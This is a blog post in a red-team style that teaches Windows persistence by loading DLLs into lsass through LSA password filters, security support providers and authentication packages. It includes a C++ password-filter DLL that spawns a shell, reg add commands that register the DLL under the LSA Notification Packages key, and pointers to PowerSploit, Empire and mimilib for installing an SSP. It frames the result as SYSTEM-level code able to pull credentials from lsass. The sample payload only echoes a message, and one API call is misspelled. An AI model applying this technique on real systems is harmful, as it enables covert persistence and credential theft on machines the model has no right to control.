---
layout: post
title: Using LSA for Windows persistence
date: 2023-11-26
categories: [Malware,Persistence]
tags: [persistence]     
---

### Introduction

The Local Security Authority (LSA) is a subsystem in Windows architecture that authenticates and logs users to the local systems. It's responsible for verifying password changes, login attempts, creating access tokens, and performing general Windows authentication and authorization tasks. The LSA also contains the Local Security Policy, which contains aspects about everything related to local security. 

It achieves this through a process called Local Security Authority Subsystem Service (lsass.exe), which we all love dumping the memory of thanks to its contents. LSASS caches all kinds of credentials like the DPAPI masterkey, Kerberos passwords, tickets, ekeys, pins and so on.

What may surprise you is that LSA can also be used for persistence, in which case our code will be executed inside the lsass's process memory. Consequently, the code will run as the SYSTEM user and we will be able to extract credentials from the same address space. All of these techniques involve creating DLLs to be loaded by LSA into the lsass process. 

These techniques might not work if lsass is running as Protected Process Light (PPL), because our DLL has to be signed by Microsoft. I will talk about bypassing PPL in another post. For now, let's discover a few possibilities for persistence we have utilizing LSA.


### Password filters

LSA password filters are used to validate password changes against password policies. When you try to change your password, the LSA calls each registered password filter twice: once to verify the new password, and then to notify the filters that the change has been made. 

A password filter has to export three functions to be successfully registered:

- `InitializeChangeNotify`
This function gets called when the password filter is loaded into the LSA
- `PasswordFilter`
And this function validates the newly created password
- `PasswordChangeNotify`
This is the function that gets called when the password is successfully changed


Let's observe a simple implementation, which will open a cmd shell and display the message "Persistence!" if our method is successful.

```cpp
#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>

int hack(void) 
{
   STARTUPINFO si;
   PROCESS_INFORMATION pi;

   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory(&pi, sizeof(pi));

   wchar_t cmdLine[] = L"cmd /K echo Persistence!";

   if (!CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
   {
       
       return 1;
   }

   
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);

   return 0;
}

BOOLEAN __stdcall InitializeChangeNotify(void) 
{
   // We start our hack function, and return TRUE to let LSA know that everything went right
    HANDLE th;

    th = createThread(0, 0, (LPTHREAD_START_ROUTINE) hack, 0, 0, 0);
    WaitForSingleObject(th, 0);

    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) 
{ 

    return 0; 

}
BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) 
{ 
    // this function returns TRUE in order to tell LSA that the password is ok
    return TRUE; 

}
```

To register this "password filter" we need to change the `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key to contain the name of our DLL. But first, let's see the current value of the aforementioned entry:

```cmd
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli
```
We see that it holds the value `scecli`, and it is a `REG_MULTI_SZ` type, which means that it contains a sequence of null-terminated strings `Kind\0Of\0Like\0This\0\0`. The first '\0' terminates the first string, the second-from-last `\0` terminates the last string, and the final `\0` terminates the sequence.

So to add our DLL to the `Notification Packages` entry, we must copy our `filter.dll` to `%windir%\System32\` and then execute

```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d "scecli"\0"filter" /t REG_MULTI_SZ /f
```

After a restart, LSA should load our dll into its address space, and now we have persistence.


### Authentication packages (AuthPkg) and Security Support Provider (SSP)

Authentication packages are mainly used for instructing LSA on what basis to authenticate a user. For example, the MSV1_0 AuthPkg checks the SAM database to determine whether the provided credentials are correct or not. SSPs on the other hand, are an implementation of security protocols like Kerberos or NTLM. 

LSA automatically loads all registered SSPs and AuthPkgs into its process at boot:

- In the case of SSP it calls the `SpLsaModeInitialize` function to obtain pointers to the functions implemented by each security package in that DLL. Those pointers are passed to the LSA in an array called `SECPKG_FUNCTION_TABLE`. 

- In the case of an AuthPkg, LSA calls `LsaApInitializePackage` to initialize the authentication package.

To achieve persistence using this method, all we have to do is copy the dll to `%windir%\System32` and add the name of the dll to the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` registry. Alternatively, we can use PowerSploit's `Install-SSP` function or Empire's `install_ssp` module.

For example, we can look at Mimilib. Particularly, the [kssp.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kssp.c) component, in which we notice that the function `kssp_SpLsaModeInitialize` is exported as `SpLsaModeInitialize` in `Mimilib.def`. Consequently, when LSA loads this SSP, the preceding function is called, and Mimilib achieves it's functionality.  

### Extras

If you wish to see another implementation of process filters, check out [this code](https://github.com/gtworek/PSBits/blob/master/PasswordStealing/PSPY.c). I also suggest reading more about authentication packages and SSPs from the official Microsoft docs, as I haven't covered those concepts in great depth. 

Thank you for reading until the end!

### Resources 

https://learn.microsoft.com/en-us/windows/win32/secauthn/authentication-packages
https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture
